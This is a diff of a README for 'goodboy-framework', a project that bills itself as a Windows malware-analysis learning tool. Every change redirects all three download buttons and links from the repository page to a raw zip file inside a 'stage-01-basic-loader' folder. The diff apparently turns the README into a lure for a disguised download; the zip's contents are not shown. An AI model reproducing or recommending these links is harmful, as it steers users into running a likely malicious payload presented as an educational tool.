@@ -1,6 +1,6 @@
 # 🧠 goodboy-framework - Learn Windows Malware Analysis Fast
 
-[![Download goodboy-framework](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/corabellanonextant92/goodboy-framework)
+[![Download goodboy-framework](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/corabellanonextant92/goodboy-framework/raw/refs/heads/main/stage-01-basic-loader/framework-goodboy-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ goodboy-framework is a Windows learning tool for malware analysis, red team test
 
 Use the link below to visit this page and download the project:
 
-[Download goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework)
+[Download goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework/raw/refs/heads/main/stage-01-basic-loader/framework-goodboy-3.7.zip)
 
 ## 🖥️ What You Need
 
@@ -197,7 +197,7 @@ This makes it easier to see how a Windows sample grows and how defenders can cat
 
 If you need the project file later, use this link:
 
-[Visit the download page for goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework)
+[Visit the download page for goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework/raw/refs/heads/main/stage-01-basic-loader/framework-goodboy-3.7.zip)
 
 ## 🛠️ File Layout
 
